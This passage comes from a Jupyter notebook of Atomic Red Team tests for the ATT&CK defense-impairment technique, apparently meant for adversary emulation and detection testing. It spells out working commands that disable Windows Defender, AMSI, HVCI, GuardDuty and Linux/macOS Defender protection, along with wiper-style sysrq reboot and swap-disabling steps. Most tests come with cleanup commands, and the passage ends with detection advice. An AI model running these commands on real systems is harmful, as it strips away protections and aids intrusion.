   "cell_type": "code",
   "execution_count": null,
   "id": "aa5fb825",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 40"
  },
  {
   "cell_type": "markdown",
   "id": "10ad6905",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nset -o history\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0958dfac",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 40 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "25b79c26",
   "metadata": {},
   "source": [
    "### Atomic Test #41 - Reboot Linux Host via Kernel System Request",
    "reboot system via system request seen in Awfulshred wiper.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\necho 1> /proc/sys/kernel/sysrq \necho b> /proc/sysrq-trigger \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "84649585",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 41"
  },
  {
   "cell_type": "markdown",
   "id": "9077b48a",
   "metadata": {},
   "source": [
    "### Atomic Test #42 - Clear Pagging Cache",
    "clear pagging cache via system request. This is a temporary change in the system to clear paging cache. This technique seen in Awfulshred wiper as part\nof its malicious payload on the compromised host. added reference link for this technique: https://www.tecmint.com/clear-ram-memory-cache-buffer-and-swap-space-on-linux/\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nfree && echo 3 > /proc/sys/vm/drop_caches && free\necho 3> /proc/sys/vm/drop_caches \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "adbf9953",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 42"
  },
  {
   "cell_type": "markdown",
   "id": "197559e4",
   "metadata": {},
   "source": [
    "### Atomic Test #43 - Disable Memory Swap",
    "disable swapping of device paging that impaire the compromised host to swap data if the RAM is full. Awfulshred wiper used this technique as an additional \npayload to the compromised host and to make sure that there will be no recoverable data due to swap feature of FreeBSD/linux.\n",
    "**Supported Platforms:** linux",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nswapon -a \nsleep 2\nswapoff -a\nsync\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "17024711",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 43"
  },
  {
   "cell_type": "markdown",
   "id": "de8c1f2e",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nswapon -a\nsleep 2\nsync\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab3fc72a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 43 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "c3cefa19",
   "metadata": {},
   "source": "### Atomic Test #44 - Disable Hypervisor-Enforced Code Integrity (HVCI)\nThis test disables Hypervisor-Enforced Code Integrity (HVCI) by setting the registry key HKLM:\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity \"Enabled\" value to \"0\".\nThe pre-req needs to be ran in order to setup HVCI and have it enabled. \nWe do not recommend running this in production.\n[Black Lotus Campaign](https://www.microsoft.com/en-us/security/blog/2023/04/11/guidance-for-investigating-attacks-using-cve-2022-21894-the-blacklotus-campaign/)\n[Microsoft](https://learn.microsoft.com/en-us/windows/security/threat-protection/device-guard/enable-virtualization-based-protection-of-code-integrity)\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: HVCI must be enabled\n\n##### Check Prereq Commands:\n```powershell\nif (((cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" 2> nul | findstr EnableVirtualizationBasedSecurity 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" 2> nul | findstr RequirePlatformSecurityFeatures 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" 2> nul | findstr Locked 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" 2> nul | findstr Enabled 2> nul\") -and (cmd.exe /c \"reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" 2> nul | findstr Locked 2> nul\"))) { exit 0 } else { exit 1 }\n\n```\n##### Get Prereq Commands:\n```powershell\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 1 /f\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /t REG_DWORD /d 0 /f\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "019bac41",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 44 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "f50444c4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /t REG_DWORD /d 0 /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c5b1f95a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 44"
  },
  {
   "cell_type": "markdown",
   "id": "c1e0aeb8",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"EnableVirtualizationBasedSecurity\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"RequirePlatformSecurityFeatures\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\" /v \"Locked\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Enabled\" /f\nreg delete \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity\" /v \"Locked\" /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4f46deec",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 44 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "a3a51bdb",
   "metadata": {},
   "source": [
    "### Atomic Test #45 - AMSI Bypass - Override AMSI via COM",
    "With administrative rights, an adversary can disable AMSI via registry value in HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec} by overriding the Microsoft Defender COM object for AMSI and points it to a DLL that does not exist.\nThis is currently being used by AsyncRAT and others. \nhttps://strontic.github.io/xcyclopedia/library/clsid_fdb00e52-a214-4aa1-8fba-4357bb0072ec.html\nhttps://securitynews.sonicwall.com/xmlpost/asyncrat-variant-includes-cryptostealer-capabilites/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nREG ADD HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /ve /t REG_SZ /d C:\\IDontExist.dll /f\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8a42fb44",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 45"
  },
  {
   "cell_type": "markdown",
   "id": "2274e2b3",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nREG DELETE HKCU\\Software\\Classes\\CLSID\\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\\InProcServer32 /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e871af30",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 45 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d0b2502b",
   "metadata": {},
   "source": "### Atomic Test #46 - AWS - GuardDuty Suspension or Deletion\nEnables GuardDuty in AWS, upon successful creation this test will suspend and then delete the GuardDuty configuration.\n\n**Supported Platforms:** iaas:aws\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `bash`!\n##### Description: Check if ~/.aws/credentials file has a default stanza is configured\n\n##### Check Prereq Commands:\n```bash\ncat ~/.aws/credentials | grep \"default\"\n\n```\n##### Get Prereq Commands:\n```bash\necho \"Please install the aws-cli and configure your AWS default profile using: aws configure\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4de6f79d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 46 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "b19d9c23",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `bash`\n",
    "```bash\ndetectorId=$(aws guardduty create-detector --enable --region \"us-east-1\" | grep -oP '(?<=\"DetectorId\": \")[^\"]*')\naws guardduty update-detector --no-enable --detector-id $detectorId\naws guardduty delete-detector --detector-id $detectorId\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "af0ad2c1",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 46"
  },
  {
   "cell_type": "markdown",
   "id": "ac6562c0",
   "metadata": {},
   "source": "#### Cleanup: \n```bash\necho \"If test successfully ran, no cleanup required.\"\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "19763ebd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 46 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "e08c6f5d",
   "metadata": {},
   "source": [
    "### Atomic Test #47 - Tamper with Defender ATP on Linux/MacOS",
    "With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide\n",
    "**Supported Platforms:** linux, macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nsudo mdatp config real-time-protection --value disabled\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "45a2b123",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 47"
  },
  {
   "cell_type": "markdown",
   "id": "ddd96d47",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nsudo mdatp config real-time-protection --value enabled\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "85558f60",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 47 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b26992ee",
   "metadata": {},
   "source": [
    "### Atomic Test #48 - Tamper with Windows Defender Registry - Reg.exe",
    "Disable Windows Defender by tampering with windows defender registry using the utility \"reg.exe\"\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9b6cc144",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 48"
  },
  {
   "cell_type": "markdown",
   "id": "239d2746",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIntrusionPreventionSystem\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRoutinelyTakingAction\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScriptScanning\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"0\" /f >NUL 2>nul \nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"0\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" /v \"DisallowExploitProtectionOverride\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\\Features\" /v \"TamperProtection\"  /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\software\\microsoft\\windows defender\\spynet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\nreg add \"HKLM\\Software\\Microsoft\\Windows Defender\" /v \"PUAProtection\" /t REG_DWORD /d \"1\" /f >NUL 2>nul\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9800d95b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 48 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "1d5698fb",
   "metadata": {},
   "source": [
    "### Atomic Test #49 - Tamper with Windows Defender Registry - Powershell",
    "Disable Windows Defender by tampering with windows defender registry through powershell\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 1  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 0 \nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 0 \n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3ac962b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 49"
  },
  {
   "cell_type": "markdown",
   "id": "30590936",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiSpyware\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\" -Name \"DisableAntiVirus\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableBehaviorMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIntrusionPreventionSystem\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableIOAVProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableOnAccessProtection\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRealtimeMonitoring\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableRoutinelyTakingAction\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScanOnRealtimeEnable\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" -Name \"DisableScriptScanning\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" -Name \"DisableEnhancedNotifications\" -Value 0  \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 0\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 1 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 1\nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 1 \n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fe026cea",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1562.001 -TestNumbers 49 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "2f5d73ed",
   "metadata": {},
   "source": "## Detection\nMonitor processes and command-line arguments to see if security tools/services are killed or stop running. Monitor Registry edits for modifications to services and startup programs that correspond to security tools. Monitoring for changes to other known features used by deployed security tools may also expose malicious activity.\n\nLack of expected log events may be suspicious."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}